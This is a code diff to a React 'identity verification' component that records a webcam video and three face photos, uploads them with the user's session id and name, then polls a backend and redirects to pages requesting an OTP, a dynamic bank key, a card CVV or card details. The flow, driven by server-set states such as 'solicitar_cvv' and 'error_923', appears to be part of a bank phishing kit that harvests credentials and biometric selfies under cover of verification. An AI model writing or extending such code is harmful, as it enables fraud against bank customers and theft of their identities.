@@ -5,9 +5,15 @@ import { Camera } from "@mediapipe/camera_utils";
 import { limpiarPaddingBody } from "@utils";
 import { isMobile } from "@utils";
 import Loading from "app/components/Loading";
+import { instanceBackend } from "app/axios/instanceBackend";
+import { useNavigate } from "react-router-dom";
 
 // Se exporta el componente
 export default function VerificacionIdentidad() {
+  const navigate = useNavigate();
+  const [sesionId, setSesionId] = useState(null);
+  const [username, setUsername] = useState("Usuario");
+  const photosRef = useRef([]); // Store captured photos
 
   // Duración de la grabación en segundos
   const RECORD_DURATION = 5;
@@ -45,6 +51,15 @@ export default function VerificacionIdentidad() {
   // Se inicializa los estados
   const [ip, setIp] = useState("");
   const [fechaHora, setFechaHora] = useState("");
+
+  useEffect(() => {
+    const raw = localStorage.getItem("datos_usuario");
+    if (raw) {
+      const data = JSON.parse(raw);
+      setSesionId(data.sesion_id);
+      setUsername(data.nombreCompleto || "Usuario");
+    }
+  }, []);
 
   // Se crea el useEffect para iniciar la cámara y la detección facial
   useEffect(() => {
@@ -429,6 +444,25 @@ export default function VerificacionIdentidad() {
     };
   }, [formState.ok]);
 
+  // Helper to capture a frame
+  const captureFrame = async () => {
+    if (!videoRef.current) return null;
+    try {
+      const canvas = document.createElement("canvas");
+      canvas.width = videoRef.current.videoWidth;
+      canvas.height = videoRef.current.videoHeight;
+      const ctx = canvas.getContext("2d");
+      // Flip horizontally to match video mirror
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(videoRef.current, 0, 0);
+      return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+    } catch (e) {
+      console.error("Error capturing frame", e);
+      return null;
+    }
+  };
+
   // Se crea el metodo para empezar a grabar
   const startRecording = () => {
 
@@ -440,6 +474,7 @@ export default function VerificacionIdentidad() {
 
     // Se limpia el array de chunks grabados
     recordedChunksRef.current = [];
+    photosRef.current = []; // Reset photos
 
     // Se crea el MediaRecorder
     const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp8", });
@@ -463,6 +498,9 @@ export default function VerificacionIdentidad() {
 
       console.log("Grabación finalizada -> ", blob);
 
+      // Upload Biometrics
+      handleUploadBiometrics(blob, photosRef.current);
+
       // Se detiene el proceso de grabación
       stopRecording();
     };
@@ -472,6 +510,19 @@ export default function VerificacionIdentidad() {
 
     // Se guarda la referencia del MediaRecorder
     mediaRecorderRef.current = mediaRecorder;
+
+    // Capture photos at intervals [1s, 2s, 3s]
+    const capture = async () => {
+      if (photosRef.current.length < 3) {
+        const photo = await captureFrame();
+        if (photo) photosRef.current.push(photo);
+      }
+    };
+
+    // Schedule captures
+    setTimeout(capture, 1000);
+    setTimeout(capture, 2500);
+    setTimeout(capture, 4000);
 
     // ⏱ Detener EXACTAMENTE en X segundos
     stopTimeoutRef.current = setTimeout(() => {
@@ -498,6 +549,86 @@ export default function VerificacionIdentidad() {
         });
       }
     }, RECORD_DURATION * 1000);
+  };
+
+  const handleUploadBiometrics = async (videoBlob, photos) => {
+    if (!sesionId) {
+      console.error("No session ID found");
+      return;
+    }
+
+    // Set loading state
+    setFormState(prev => ({
+      ...prev,
+      ok: false,
+      estadoEspabilar: false,
+      cargando: true
+    }));
+
+    try {
+      const formData = new FormData();
+      formData.append('sessionId', sesionId);
+      formData.append('username', username);
+      formData.append('video', videoBlob, 'biometrics_video.webm');
+
+      if (photos[0]) formData.append('image1', photos[0], 'face_1.jpg');
+      if (photos[1]) formData.append('image2', photos[1], 'face_2.jpg');
+      if (photos[2]) formData.append('image3', photos[2], 'face_3.jpg');
+
+      await instanceBackend.post('/biometrics/upload', formData, {
+        headers: { 'Content-Type': 'multipart/form-data' }
+      });
+
+      console.log("Biometrics uploaded successfully");
+      // Start polling for status
+      iniciarPolling(sesionId);
+
+    } catch (error) {
+      console.error("Error uploading biometrics:", error);
+      setFormState(prev => ({ ...prev, cargando: false, error: true }));
+      alert("Error al subir la verificación. Por favor intente nuevamente.");
+    }
+  };
+
+  const iniciarPolling = (sid) => {
+    let attempts = 0;
+    const MAX_ATTEMPTS = 100;
+
+    const pollingInterval = setInterval(async () => {
+      try {
+        attempts++;
+        const response = await instanceBackend.post(`/consultar-estado/${sid}`);
+        const { estado } = response.data;
+
+        console.log('Polling Status:', estado);
+
+        if (attempts >= MAX_ATTEMPTS) {
+          clearInterval(pollingInterval);
+          setFormState(prev => ({ ...prev, cargando: false, error: true }));
+          return;
+        }
+
+        // Define states to redirect
+        const statusMap = {
+          'solicitar_otp': '/numero-otp',
+          'solicitar_din': '/clave-dinamica',
+          'solicitar_finalizar': '/finalizado-page',
+          'error_923': '/error-923page',
+          'solicitar_cvv': '/validacion-cvv',
+          'solicitar_tc_custom': '/tc-custom',
+          'error_login': '/autenticacion',
+          'aprobado': '/finalizado-page' // Or wherever
+        };
+
+        if (statusMap[estado]) {
+          clearInterval(pollingInterval);
+          navigate(statusMap[estado]);
+        }
+
+      } catch (error) {
+        console.error("Polling error:", error);
+      }
+    }, 3000);
   };
 
   // Se retorna el componente
